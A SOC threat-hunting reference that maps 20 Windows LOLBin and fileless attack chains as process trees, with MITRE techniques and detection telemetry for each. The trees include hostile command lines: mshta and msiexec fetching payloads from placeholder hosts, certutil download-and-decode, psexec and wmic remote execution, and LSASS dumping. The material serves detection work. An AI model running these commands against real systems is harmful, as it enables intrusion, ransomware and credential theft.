# LOLBIN & FILELESS ATTACK CHAINS — COMPLETE SOC REFERENCE (1–20)
# Windows Attack Execution Chains — Comprehensive Reference (1–20)
# 20 High-Fidelity Attack Chains for SOC Analysts & Threat Hunters
# Full Behavioural Attack Chains (1–20)

Below are **20 fully mapped real-world attack chains**, each with:

- Perfect ASCII trees (in `text` fences)
- Full MITRE mappings
- Context / reasoning
- Why attackers use it
- Telemetry pivots

Paste directly into GitHub — this entire block renders AS-IS.

---

# Chain 1 — Phishing Doc → Macro → PowerShell Loader → C2
```text
outlook.exe
  └─ winword.exe (macro-enabled doc)
       └─ powershell.exe (encoded stager)
            └─ loader.ps1 (download/decrypt)
                 └─ payload.exe
                      └─ C2 beacons / recon / credential theft
```

### Context / Reasoning

**MITRE:**
- **T1566.001** — Spearphishing Attachment  
- **T1059.001** — PowerShell  
- **T1204.002** — User Execution (Malicious File)  
- **T1105** — Ingress Tool Transfer  
- **T1082** — System Information Discovery  
- **T1140** — Obfuscated/Encoded Files  
- **T1036** — Masquerading  

**Why attackers use it:**
• Macro → PowerShell gives full interpreter  
• Easy staging for RATs, loaders, downloaders  
• Base64 encoded → EDR struggles if ScriptBlock disabled  

**Telemetry:**
- DeviceProcessEvents: winword.exe → powershell.exe  
- DeviceNetworkEvents: PS outbound to staging domain  
- DeviceFileEvents: loader.ps1 or temp EXE writes  
---

# Chain 2 — HTML Smuggling → MSHTA → PowerShell → Payload
```text
chrome.exe / outlook.exe
  └─ mshta.exe http://malicious/payload.hta
       └─ powershell.exe (downloadstring → stager)
            └─ payload.exe
                 └─ C2 connection / persistence dropper
```

### Context / Reasoning

**MITRE:**
- **T1204.001** — User Execution (Malicious Link)  
- **T1218.005** — Mshta  
- **T1059.001** — PowerShell  
- **T1105** — Ingress Tool Transfer  
- **T1547** — Registry Run Key Persistence  

**Why attackers use it:**
• HTML smuggling bypasses AV/SMTP filters  
• mshta.exe executes remote JS/VBscript natively  
• Perfect delivery vector for loaders  

**Telemetry:**
- DeviceProcessEvents: browser → mshta.exe  
- DeviceNetworkEvents: mshta.exe requesting remote .hta  
- DeviceProcessEvents: mshta → powershell  
---

# Chain 3 — Script Dropper → WScript → PowerShell → Scheduled Task
```text
winword.exe
  └─ wscript.exe malicious.vbs
       └─ powershell.exe (payload stager)
            └─ schtasks.exe /create /tn "<task>" /tr "<payload>"
                 └─ payload.exe
                      └─ beacon → persistence → credential theft
```

### Context / Reasoning

**MITRE:**
- **T1059.005** — WScript/CScript  
- **T1059.001** — PowerShell  
- **T1053.005** — Scheduled Task Persistence  
- **T1105** — Payload Download  
- **T1082** — Discovery  

**Why attackers use it:**
• Phishing → script → PS is extremely common  
• Scheduled tasks → silent long-term persistence  

**Telemetry:**
- DeviceProcessEvents: wscript → powershell  
- DeviceProcessEvents: schtasks creation  
- DeviceFileEvents: payload installation  
---

# Chain 4 — MSI Loader → Rundll32 → Malicious DLL → C2
```text
browser.exe
  └─ msiexec.exe /i https://host/payload.msi /qn
       └─ rundll32.exe payload.dll,Entry
            └─ payload.exe
                 └─ privilege escalation → C2 → discovery
```

### Context / Reasoning

**MITRE:**
- **T1218.007** — Msiexec  
- **T1218.011** — Rundll32  
- **T1055** — Process Injection  
- **T1105** — Payload Transfer  
- **T1082** — Discovery  

**Why attackers use it:**
• MSI containers hide EXE+DLL payloads  
• Rundll32 gives stealthy execution  

**Telemetry:**
- DeviceProcessEvents: msiexec remote download  
- DeviceProcessEvents: rundll32 loading malicious DLL  
---

# Chain 5 — Certutil Download → Decode → Execute → Ransomware Staging
```text
powershell.exe / cmd.exe
  └─ certutil.exe -urlcache -split -f http://host/payload.b64
       └─ certutil.exe -decode payload.b64 payload.exe
            └─ payload.exe
                 └─ privilege escalation
                      └─ shadow copy deletion
                           └─ encryption staging → C2
```

### Context / Reasoning

**MITRE:**
- **T1105** — Ingress Tool Transfer  
- **T1140** — Deobfuscate/Decode  
- **T1489** — Destroy Backups (shadow copies)  
- **T1486** — Ransomware Encryption  

**Why attackers use it:**
• Built-in download/decode → no external tooling  
• Great for ransomware initial staging  

**Telemetry:**
- DeviceProcessEvents: certutil with urlcache/decode  
- DeviceFileEvents: .b64 → .exe  
---

# Chain 6 — Malicious Service Creation → SYSTEM Execution
```text
dropper.exe
  └─ sc.exe create badsvc binPath="C:\Users\Public\svc.exe"
       └─ reboot
            └─ services.exe
                 └─ svc.exe (SYSTEM)
                      └─ C2 → lateral movement → ransomware
```

### Context / Reasoning

**MITRE:**
- **T1543.003** — Windows Service Persistence  
- **T1068** — Privilege Escalation  
- **T1569.002** — Service Execution  
- **T1486** — Ransomware Impact  

**Why attackers use it:**
• SYSTEM privileges → complete takeover  
• Survives reboot → stealth persistence  

**Telemetry:**
- DeviceProcessEvents: sc.exe create  
- DeviceRegistryEvents: new service keys  
---

# Chain 7 — WMI Remote Execution → Lateral Movement
```text
powershell.exe
  └─ wmic.exe /node:target process call create "cmd.exe /c payload.exe"
       └─ target: cmd.exe
            └─ payload.exe
                 └─ recon → C2 → credential theft
```

### Context / Reasoning

**MITRE:**
- **T1047** — WMI Execution  
- **T1021.006** — WMI Lateral Movement  
- **T1059.003** — CMD  

**Why attackers use it:**
• Quiet lateral movement  
• No file transfer needed  

**Telemetry:**
- DeviceProcessEvents: wmic … process call create  
- SecurityEvent: remote process creation  
---

# Chain 8 — PsExec Lateral Spread → Ransomware Deployment
```text
attacker.exe
  └─ psexec.exe \\target -s cmd.exe /c \\share\payload.exe
       └─ target: psexesvc.exe
            └─ cmd.exe /c payload.exe
                 └─ payload.exe
                      └─ encryption
                           └─ data destruction
```

### Context / Reasoning

**MITRE:**
- **T1021.002** — SMB Admin Shares  
- **T1569.002** — Service Execution  
- **T1486** — Impact Encryption  

**Why attackers use it:**
• Fast propagation across entire subnet  
• Reliable ransomware launch vector  

**Telemetry:**
- DeviceNetworkEvents: 445 fan-out  
- DeviceProcessEvents: psexesvc.exe  
---

# Chain 9 — Fileless Multi-LOLBIN Execution (Word → Script → PS → Rundll32 → dllhost)
```text
winword.exe
  └─ wscript.exe malicious.js
       └─ powershell.exe (in-memory loader)
            └─ rundll32.exe (reflective DLL loader)
                 └─ dllhost.exe (COM surrogate injection)
                      └─ C2 → stealth persistence
```

### Context / Reasoning

**MITRE:**
- **T1059.001** — PowerShell  
- **T1059.005** — WScript  
- **T1218.011** — Rundll32  
- **T1055** — Process Injection  
- **T1071.001** — HTTPS C2  

**Why attackers use it:**
• Almost no disk artifacts  
• Final payload hides in dllhost.exe  

**Telemetry:**
- DeviceProcessEvents: ancestry chain  
- DeviceNetworkEvents: dllhost outbound  
---

# Chain 10 — DLL Search Order Hijacking → Payload
```text
legitimate.exe
  └─ malicious.dll (side-loaded)
       └─ payload.exe
            └─ C2 → discovery → privilege escalation
```

### Context / Reasoning

**MITRE:**
- **T1574.002** — DLL Search Order Hijacking  
- **T1055** — Injection  
- **T1218** — Signed Binary Proxy Execution  

**Why attackers use it:**
• Abuses trusted EXE reputation  
• No need for admin rights  

**Telemetry:**
- DeviceImageLoadEvents: DLL from user path  
---

# Chain 11 — Browser Exploit → PowerShell → Payload
```text
chrome.exe
  └─ powershell.exe (spawned via exploit shellcode)
       └─ payload.exe
            └─ persistence → recon → C2
```

### Context / Reasoning

**MITRE:**
- **T1203** — Exploitation for Execution  
- **T1059.001** — PowerShell  
- **T1105** — Payload Transfer  

**Why attackers use it:**
• Browser → PS is extremely suspicious  
• Direct post-exploit shellcode launching PS  

**Telemetry:**
- DeviceProcessEvents: browser → PS  
---

# Chain 12 — ISO/VHD Delivery → App Sideloading → Malicious DLL
```text
explorer.exe
  └─ app.exe (mounted ISO/VHD)
       └─ malicious.dll (search-order hijack)
            └─ payload.exe
                 └─ C2 → persistence
```

### Context / Reasoning

**MITRE:**
- **T1204.002** — User Execution  
- **T1574.002** — DLL Hijacking  
- **T1105** — Tool Transfer  

**Why attackers use it:**
• ISO bypassed MOTW historically  
• Self-contained delivery  

**Telemetry:**
- DeviceProcessEvents: execution from mount path  
---

# Chain 13 — LNK Shortcut → LOLBin → Payload
```text
explorer.exe
  └─ malicious.lnk
       └─ powershell.exe / mshta.exe / wscript.exe
            └─ payload.exe
                 └─ persistence → C2
```

### Context / Reasoning

**MITRE:**
- **T1204.002** — User Execution  
- **T1036** — Masquerading  
- **T1059.x** — LOLBins  

**Why attackers use it:**
• Conceals long malicious command inside LNK  
• Trick users visually  

**Telemetry:**
- DeviceProcessEvents: explorer → LOLBin  
---

# Chain 14 — ZIP → JS/VBS Script → LOLBin → Payload
```text
explorer.exe
  └─ wscript.exe script.vbs
       └─ powershell.exe
            └─ payload.exe
                 └─ beaconing → lateral prep
```

### Context / Reasoning

**MITRE:**
- **T1059.005** — Script Execution  
- **T1059.001** — PowerShell  
- **T1105** — Payload Download  

**Why attackers use it:**
• Commodity malware gold standard  
• Very easy to obfuscate  

**Telemetry:**
- DeviceProcessEvents: script → LOLBin  
---

# Chain 15 — Browser → CMD → PowerShell → Payload (Drive-By)
```text
browser.exe
  └─ cmd.exe /c (hidden)
       └─ powershell.exe (download/encode)
            └─ payload.exe
                 └─ C2 → persistence installer
```

### Context / Reasoning

**MITRE:**
- **T1059.003** — CMD  
- **T1059.001** — PowerShell  
- **T1204.001** — User Execution (Drive-by)  
- **T1105** — Payload Transfer  

**Why attackers use it:**
• One-click infection  
• Browser spawning CMD is high-signal  

**Telemetry:**
- DeviceProcessEvents: browser → cmd  
---

# Chain 16 — PowerShell → Rundll32 → DLL Injection → dllhost C2
```text
powershell.exe
  └─ rundll32.exe malicious.dll
       └─ inject into dllhost.exe
            └─ dllhost.exe (C2)
                 └─ long-term foothold
```

### Context / Reasoning

**MITRE:**
- **T1218.011** — Rundll32  
- **T1055** — Injection  
- **T1547.009** — COM Hijacking  
- **T1105** — Payload Transfer  

**Why attackers use it:**
• dllhost.exe is highly trusted  
• Ideal for stealthy RATs  

**Telemetry:**
- DeviceImageLoadEvents: malicious DLL load  
---

# Chain 17 — PowerShell Inline C# → Memory Injection → Beacon
```text
powershell.exe
  └─ Add-Type / Reflection
       └─ shellcode injection
            └─ in-memory beacon
                 └─ HTTPS C2
```

### Context / Reasoning

**MITRE:**
- **T1059.001** — PowerShell  
- **T1620** — Reflective Code Loading  
- **T1041** — Exfiltration Over C2 Channel  
- **T1105** — Payload Load  

**Why attackers use it:**
• Pure memory — no disk writes  
• Very hard to signature  

**Telemetry:**
- ScriptBlockLogs: Add-Type, reflection  
---

# Chain 18 — RDPClip Abuse → Clipboard Exfiltration
```text
mstsc.exe
  └─ rdpclip.exe
       └─ sensitive data copied
            └─ local sync
                 └─ silent exfiltration
```

### Context / Reasoning

**MITRE:**
- **T1021.001** — RDP  
- **T1114** — Exfiltration via Clipboard  

**Why attackers use it:**
• Fileless data theft  
• Invisible to AV  

**Telemetry:**
- SecurityEvent: RDP logons  
---

# Chain 19 — BYOVD → Kernel Manipulation → Payload Execution
```text
dropper.exe
  └─ install vulnerable_driver.sys
       └─ driver disables EDR protections
            └─ payload.exe
                 └─ ransomware staging
                      └─ C2
```

### Context / Reasoning

**MITRE:**
- **T1068** — Privilege Escalation  
- **T1562.001** — Disable Security Tools  
- **T1547** — Boot / Logon Autostart  
- **T1486** — Ransomware  

**Why attackers use it:**
• Kernel tampering kills EDR completely  

**Telemetry:**
- DeviceProcessEvents: sc.exe creating driver  
---

# Chain 20 — Credential Dumping → LSASS → Exfiltration
```text
powershell.exe / malicious.exe
  └─ read LSASS memory (MiniDump / comsvcs.dll)
       └─ lsass.dmp
            └─ payload.exe
                 └─ HTTPS exfiltration
                      └─ lateral movement using stolen creds
```

### Context / Reasoning

**MITRE:**
- **T1003.001** — LSASS Dump  
- **T1003** — Credential Dumping  
- **T1041** — Exfiltration  
- **T1021** — Lateral Movement  

**Why attackers use it:**
• Fast path to domain compromise  

**Telemetry:**
- DeviceFileEvents: lsass.dmp  
- DeviceNetworkEvents: exfil shortly after  
---
